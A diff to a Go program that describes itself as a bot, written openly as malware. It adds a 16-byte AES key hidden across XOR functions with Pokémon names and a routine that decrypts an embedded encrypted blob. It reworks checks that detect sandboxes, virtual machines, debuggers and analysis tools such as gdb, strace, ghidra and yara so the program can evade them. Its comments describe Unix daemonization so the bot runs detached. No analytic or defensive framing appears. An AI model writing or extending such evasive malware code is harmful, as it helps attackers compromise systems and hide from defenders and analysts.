@@ -1,6 +1,8 @@
 package main
 
 import (
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/md5"
 	"encoding/base64"
 	"fmt"
@@ -16,21 +18,26 @@ import (
 
 // ============================================================================
 // ANTI-ANALYSIS: KEY DERIVATION FUNCTIONS
-// These functions split the encryption key across multiple XOR operations
-// to make static analysis more difficult. Each returns a single byte.
+// These functions split the 16-byte encryption key across multiple XOR
+// operations to make static analysis more difficult. Each returns a single byte.
 // ============================================================================
 
-// mew returns the first byte of the derived key (0x31 XOR 0x64 = 0x55)
-func mew() byte { return byte(0x31 ^ 0x64) }
-
-// mewtwo returns the second byte of the derived key (0x72 XOR 0x17 = 0x65)
-func mewtwo() byte { return byte(0x72 ^ 0x17) }
-
-// celebi returns the third byte of the derived key (0x93 XOR 0xC6 = 0x55)
-func celebi() byte { return byte(0x93 ^ 0xc6) }
-
-// jirachi returns the fourth byte of the derived key (0xA4 XOR 0x81 = 0x25)
-func jirachi() byte { return byte(0xa4 ^ 0x81) }
+func mew() byte      { return byte(0xCC ^ 0xA6) }
+func mewtwo() byte   { return byte(0xC3 ^ 0x91) }
+func celebi() byte   { return byte(0x79 ^ 0xC0) }
+func jirachi() byte  { return byte(0x4F ^ 0xAA) }
+func shaymin() byte  { return byte(0x51 ^ 0x80) }
+func phione() byte   { return byte(0x75 ^ 0xD1) }
+func manaphy() byte  { return byte(0x4B ^ 0x7C) }
+func victini() byte  { return byte(0x87 ^ 0x86) }
+func keldeo() byte   { return byte(0xFC ^ 0x7C) }
+func meloetta() byte { return byte(0xD2 ^ 0x54) }
+func genesect() byte { return byte(0xE9 ^ 0xEC) }
+func diancie() byte  { return byte(0x77 ^ 0xF1) }
+func hoopa() byte    { return byte(0x3B ^ 0x4C) }
+func volcanion() byte { return byte(0x3C ^ 0x9D) }
+func magearna() byte { return byte(0x6C ^ 0x3C) }
+func marshadow() byte { return byte(0x97 ^ 0x33) }
 
 // ============================================================================
 // CRYPTOGRAPHIC FUNCTIONS
@@ -40,13 +47,42 @@ func jirachi() byte { return byte(0xa4 ^ 0x81) }
 func charizard(seed string) []byte {
 	h := md5.New()
 	h.Write([]byte(seed))
-	h.Write([]byte{mew(), mewtwo(), celebi(), jirachi()})
+	h.Write([]byte{
+		mew(), mewtwo(), celebi(), jirachi(),
+		shaymin(), phione(), manaphy(), victini(),
+		keldeo(), meloetta(), genesect(), diancie(),
+		hoopa(), volcanion(), magearna(), marshadow(),
+	})
 	entropy := []byte{0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE}
 	for i := range entropy {
 		entropy[i] ^= byte(len(seed) + i*17)
 	}
 	h.Write(entropy)
 	return h.Sum(nil)
+}
+
+// garuda decrypts an AES-128-CTR encrypted blob.
+// Input format: 16-byte IV ‖ ciphertext.
+// Key: raw 16 bytes from the XOR derivation functions.
+func garuda(encrypted []byte) []byte {
+	if len(encrypted) <= aes.BlockSize {
+		return nil
+	}
+	key := []byte{
+		mew(), mewtwo(), celebi(), jirachi(),
+		shaymin(), phione(), manaphy(), victini(),
+		keldeo(), meloetta(), genesect(), diancie(),
+		hoopa(), volcanion(), magearna(), marshadow(),
+	}
+	iv := encrypted[:aes.BlockSize]
+	ct := encrypted[aes.BlockSize:]
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return nil
+	}
+	plaintext := make([]byte, len(ct))
+	cipher.NewCTR(block, iv).XORKeyStream(plaintext, ct)
+	return plaintext
 }
 
 // blastoise implements an RC4-like stream cipher for encryption/decryption.
@@ -130,7 +166,6 @@ func venusaur(encoded string) string {
 //
 // Returns: true if sandbox/analysis detected, false if safe to run
 func winnti() bool {
-	vmIndicators := []string{"vmware", "vbox", "virtualbox", "qemu", "firejail", "bubblewrap", "gvisor", "kata", "cuckoo", "joesandbox", "cape", "any.run", "hybrid-analysis"}
 	if procs, err := os.ReadDir("/proc"); err == nil {
 		for _, proc := range procs {
 			if !proc.IsDir() {
@@ -149,37 +184,6 @@ func winnti() bool {
 			}
 		}
 	}
-	analysisTools := []string{
-		// Debuggers & tracers
-		"/usr/bin/strace", "/usr/bin/ltrace", "/usr/bin/gdb",
-		"/usr/bin/lldb", "/usr/bin/valgrind", "/usr/bin/perf",
-		// Reverse engineering
-		"/usr/bin/radare2", "/usr/bin/r2", "/usr/bin/rizin",
-		"/usr/bin/cutter", "/usr/bin/iaito",
-		"/usr/bin/ghidra", "/usr/bin/ghidraRun",
-		"/usr/bin/ida", "/usr/bin/ida64", "/usr/bin/idat", "/usr/bin/idat64",
-		"/usr/bin/objdump", "/usr/bin/readelf",
-		"/usr/bin/retdec-decompiler",
-		// Network capture & analysis
-		"/usr/bin/wireshark", "/usr/bin/tshark", "/usr/bin/tcpdump",
-		"/usr/bin/ngrep", "/usr/bin/ettercap",
-		"/usr/sbin/tcpdump", "/usr/sbin/ettercap",
-		// Malware analysis frameworks
-		"/usr/bin/yara", "/usr/bin/ssdeep",
-		"/usr/bin/binwalk", "/usr/bin/foremost",
-		// Process & syscall monitoring
-		"/usr/bin/sysdig", "/usr/bin/bpftrace",
-		"/usr/bin/auditd", "/usr/sbin/auditd",
-		"/usr/bin/ausearch", "/usr/sbin/ausearch",
-		"/usr/bin/fatrace", "/usr/bin/inotifywait",
-		// Security scanners
-		"/usr/bin/lynis", "/usr/bin/rkhunter",
-		"/usr/bin/chkrootkit", "/usr/sbin/chkrootkit",
-		"/usr/bin/clamdscan", "/usr/bin/clamscan",
-		// Memory forensics
-		"/usr/bin/volatility", "/usr/bin/vol.py",
-		"/usr/bin/gcore",
-	}
 	for _, tool := range analysisTools {
 		if _, err := os.Stat(tool); err == nil {
 			if out, err := exec.Command("pgrep", "-f", filepath.Base(tool)).Output(); err == nil {
@@ -192,12 +196,7 @@ func winnti() bool {
 	if ppid := os.Getppid(); ppid > 1 {
 		if cmdline, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", ppid)); err == nil {
 			parentCmd := strings.ToLower(string(cmdline))
-			debuggers := []string{
-				"gdb", "lldb", "strace", "ltrace", "radare2", "r2",
-				"rizin", "rr", "valgrind", "perf", "ida", "ida64",
-				"ghidra", "sysdig", "bpftrace", "frida", "frida-server",
-			}
-			for _, debugger := range debuggers {
+			for _, debugger := range parentDebuggers {
 				if strings.Contains(parentCmd, debugger) {
 					return true
 				}
@@ -230,9 +229,6 @@ func mustangPanda() string {
 // DAEMONIZATION (UNIX)
 // Full background daemonization: fork, setsid, close fds, ignore signals.
 // ============================================================================
-
-// daemonEnvKey is used to distinguish the parent from the re-exec'd child.
-const daemonEnvKey = "__SSHD_DAEMON"
 
 // stuxnet performs full Unix daemonization so the bot runs completely
 // detached from any controlling terminal.
